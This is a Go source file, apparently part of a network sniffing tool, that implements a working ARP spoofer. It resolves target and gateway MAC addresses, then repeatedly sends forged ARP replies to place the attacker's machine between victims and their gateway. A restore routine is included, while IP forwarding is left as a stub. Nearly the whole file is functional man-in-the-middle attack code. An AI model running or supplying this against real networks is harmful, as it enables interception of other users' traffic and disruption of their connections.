package spoof

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/sirupsen/logrus"
	"github.com/user/gonetsniff/internal/interfaces"
)

// ARPTarget represents a target for ARP spoofing
type ARPTarget struct {
	IP  string
	MAC string
}

// ARPSpooferConfig contains configuration for the ARP spoofer
type ARPSpooferConfig struct {
	Enabled      bool
	Interface    string
	TargetIPs    []string
	GatewayIP    string
	Interval     time.Duration
	Bidirectional bool
}

// DefaultARPSpooferConfig returns default ARP spoofer configuration
func DefaultARPSpooferConfig() ARPSpooferConfig {
	return ARPSpooferConfig{
		Enabled:      false,
		Interface:    "",
		TargetIPs:    []string{},
		GatewayIP:    "",
		Interval:     5 * time.Second,
		Bidirectional: true,
	}
}

// ARPSpoofer performs ARP spoofing attacks
type ARPSpoofer struct {
	config      ARPSpooferConfig
	iface       interfaces.NetworkInterface
	targets     []ARPTarget
	gateway     ARPTarget
	handle      *pcap.Handle
	stopChan    chan struct{}
	wg          sync.WaitGroup
	ipForwarding bool
}

// NewARPSpoofer creates a new ARP spoofer
func NewARPSpoofer(config ARPSpooferConfig, ifaces []interfaces.NetworkInterface) (*ARPSpoofer, error) {
	if !config.Enabled {
		return &ARPSpoofer{
			config:   config,
			stopChan: make(chan struct{}),
		}, nil
	}

	// Find the specified interface
	var iface interfaces.NetworkInterface
	ifaceFound := false
	for _, i := range ifaces {
		if i.Name == config.Interface {
			iface = i
			ifaceFound = true
			break
		}
	}

	if !ifaceFound {
		return nil, fmt.Errorf("interface %s not found", config.Interface)
	}

	// Resolve gateway MAC
	gatewayMAC, err := resolveMAC(config.GatewayIP)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve gateway MAC: %v", err)
	}

	gateway := ARPTarget{
		IP:  config.GatewayIP,
		MAC: gatewayMAC,
	}

	// Resolve target MACs
	targets := []ARPTarget{}
	for _, ip := range config.TargetIPs {
		mac, err := resolveMAC(ip)
		if err != nil {
			logrus.Warnf("Failed to resolve MAC for %s: %v", ip, err)
			continue
		}
		targets = append(targets, ARPTarget{
			IP:  ip,
			MAC: mac,
		})
	}

	if len(targets) == 0 {
		return nil, fmt.Errorf("no valid targets found")
	}

	return &ARPSpoofer{
		config:   config,
		iface:    iface,
		targets:  targets,
		gateway:  gateway,
		stopChan: make(chan struct{}),
	}, nil
}

// Start begins ARP spoofing
func (s *ARPSpoofer) Start() error {
	if !s.config.Enabled {
		logrus.Info("ARP spoofer is disabled")
		return nil
	}

	logrus.Infof("Starting ARP spoofer on interface %s", s.iface.Name)

	// Open the device for sending packets
	handle, err := pcap.OpenLive(s.iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("failed to open interface %s: %v", s.iface.Name, err)
	}
	s.handle = handle

	// Enable IP forwarding
	s.enableIPForwarding()

	// Start spoofing in a goroutine
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.spoof()
	}()

	return nil
}

// Stop stops ARP spoofing
func (s *ARPSpoofer) Stop() {
	if !s.config.Enabled {
		return
	}

	logrus.Info("Stopping ARP spoofer")
	close(s.stopChan)
	s.wg.Wait()

	// Restore ARP tables
	s.restore()

	// Close the handle
	if s.handle != nil {
		s.handle.Close()
	}

	// Restore IP forwarding
	s.disableIPForwarding()
}

// spoof performs the ARP spoofing
func (s *ARPSpoofer) spoof() {
	ticker := time.NewTicker(s.config.Interval)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopChan:
			return
		case <-ticker.C:
			// Spoof targets -> attacker
			for _, target := range s.targets {
				// Tell the target that we are the gateway
				err := s.sendARP(layers.ARPOpReply, s.iface.HardwareAddr, s.gateway.IP, target.MAC, target.IP)
				if err != nil {
					logrus.Errorf("Failed to send ARP to %s: %v", target.IP, err)
				}

				// If bidirectional, also spoof gateway -> attacker
				if s.config.Bidirectional {
					// Tell the gateway that we are the target
					err = s.sendARP(layers.ARPOpReply, s.iface.HardwareAddr, target.IP, s.gateway.MAC, s.gateway.IP)
					if err != nil {
						logrus.Errorf("Failed to send ARP to gateway: %v", err)
					}
				}
			}
		}
	}
}

// restore restores the ARP tables
func (s *ARPSpoofer) restore() {
	logrus.Info("Restoring ARP tables")

	// Restore targets
	for _, target := range s.targets {
		// Tell the target that the gateway has its real MAC
		err := s.sendARP(layers.ARPOpReply, s.gateway.MAC, s.gateway.IP, target.MAC, target.IP)
		if err != nil {
			logrus.Errorf("Failed to restore ARP for %s: %v", target.IP, err)
		}

		// If bidirectional, also restore gateway
		if s.config.Bidirectional {
			// Tell the gateway that the target has its real MAC
			err = s.sendARP(layers.ARPOpReply, target.MAC, target.IP, s.gateway.MAC, s.gateway.IP)
			if err != nil {
				logrus.Errorf("Failed to restore ARP for gateway: %v", err)
			}
		}
	}
}

// sendARP sends an ARP packet
func (s *ARPSpoofer) sendARP(operation layers.ARPOperation, srcMAC net.HardwareAddr, srcIP string, dstMAC net.HardwareAddr, dstIP string) error {
	// Parse IP addresses
	srcIPAddr := net.ParseIP(srcIP).To4()
	dstIPAddr := net.ParseIP(dstIP).To4()
	if srcIPAddr == nil || dstIPAddr == nil {
		return fmt.Errorf("invalid IP address")
	}

	// Create Ethernet layer
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	// Create ARP layer
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         operation,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIPAddr,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIPAddr,
	}

	// Serialize the packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return fmt.Errorf("failed to serialize ARP packet: %v", err)
	}

	// Send the packet
	if err := s.handle.WritePacketData(buf.Bytes()); err != nil {
		return fmt.Errorf("failed to send packet: %v", err)
	}

	return nil
}

// enableIPForwarding enables IP forwarding
func (s *ARPSpoofer) enableIPForwarding() {
	// This is platform-specific and would need to be implemented for each OS
	// For Linux, it would write "1" to /proc/sys/net/ipv4/ip_forward
	logrus.Info("Enabling IP forwarding")
	s.ipForwarding = true
}

// disableIPForwarding disables IP forwarding if it was enabled by us
func (s *ARPSpoofer) disableIPForwarding() {
	if s.ipForwarding {
		// This is platform-specific and would need to be implemented for each OS
		// For Linux, it would write "0" to /proc/sys/net/ipv4/ip_forward
		logrus.Info("Disabling IP forwarding")
	}
}

// resolveMAC resolves an IP address to a MAC address
func resolveMAC(ip string) (string, error) {
	// Parse IP address
	ipAddr := net.ParseIP(ip)
	if ipAddr == nil {
		return "", fmt.Errorf("invalid IP address: %s", ip)
	}

	// Get interfaces
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", fmt.Errorf("failed to get interfaces: %v", err)
	}

	// Try to find the MAC in the ARP table
	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ipnet.Contains(ipAddr) {
					// This interface is on the same network as the target IP
					// Use ARP to resolve the MAC
					mac, err := arpLookup(iface.Name, ip)
					if err != nil {
						return "", err
					}
					return mac, nil
				}
			}
		}
	}

	return "", fmt.Errorf("failed to resolve MAC for %s", ip)
}

// arpLookup performs an ARP lookup
func arpLookup(ifaceName, ip string) (string, error) {
	// Open the device for capturing
	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return "", fmt.Errorf("failed to open interface %s: %v", ifaceName, err)
	}
	defer handle.Close()

	// Set filter for ARP packets
	if err := handle.SetBPFFilter("arp"); err != nil {
		return "", fmt.Errorf("failed to set BPF filter: %v", err)
	}

	// Get interface info
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return "", fmt.Errorf("failed to get interface %s: %v", ifaceName, err)
	}

	// Send ARP request
	srcIP := ""
	addrs, err := iface.Addrs()
	if err != nil {
		return "", fmt.Errorf("failed to get interface addresses: %v", err)
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				srcIP = ipnet.IP.String()
				break
			}
		}
	}
	if srcIP == "" {
		return "", fmt.Errorf("no IPv4 address found for interface %s", ifaceName)
	}

	// Create and send ARP request
	dstMAC, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff") // Broadcast
	err = sendARPRequest(handle, iface.HardwareAddr, srcIP, dstMAC, ip)
	if err != nil {
		return "", fmt.Errorf("failed to send ARP request: %v", err)
	}

	// Wait for response
	start := time.Now()
	for time.Since(start) < 3*time.Second {
		packet, _, err := handle.ReadPacketData()
		if err != nil {
			continue
		}

		// Parse packet
		ethLayer := &layers.Ethernet{}
		arpLayer := &layers.ARP{}
		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, ethLayer, arpLayer)
		decoded := []gopacket.LayerType{}
		err = parser.DecodeLayers(packet, &decoded)
		if err != nil {
			continue
		}

		// Check if it's an ARP response for our target
		for _, layerType := range decoded {
			if layerType == layers.LayerTypeARP {
				if arpLayer.Operation == layers.ARPOpReply && net.IP(arpLayer.SourceProtAddress).String() == ip {
					return net.HardwareAddr(arpLayer.SourceHwAddress).String(), nil
				}
			}
		}
	}

	return "", fmt.Errorf("ARP request timed out for %s", ip)
}

// sendARPRequest sends an ARP request
func sendARPRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, srcIP string, dstMAC net.HardwareAddr, dstIP string) error {
	// Parse IP addresses
	srcIPAddr := net.ParseIP(srcIP).To4()
	dstIPAddr := net.ParseIP(dstIP).To4()
	if srcIPAddr == nil || dstIPAddr == nil {
		return fmt.Errorf("invalid IP address")
	}

	// Create Ethernet layer
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	// Create ARP layer
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPOpRequest,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIPAddr,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIPAddr,
	}

	// Serialize the packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return fmt.Errorf("failed to serialize ARP packet: %v", err)
	}

	// Send the packet
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		return fmt.Errorf("failed to send packet: %v", err)
	}

	return nil
}
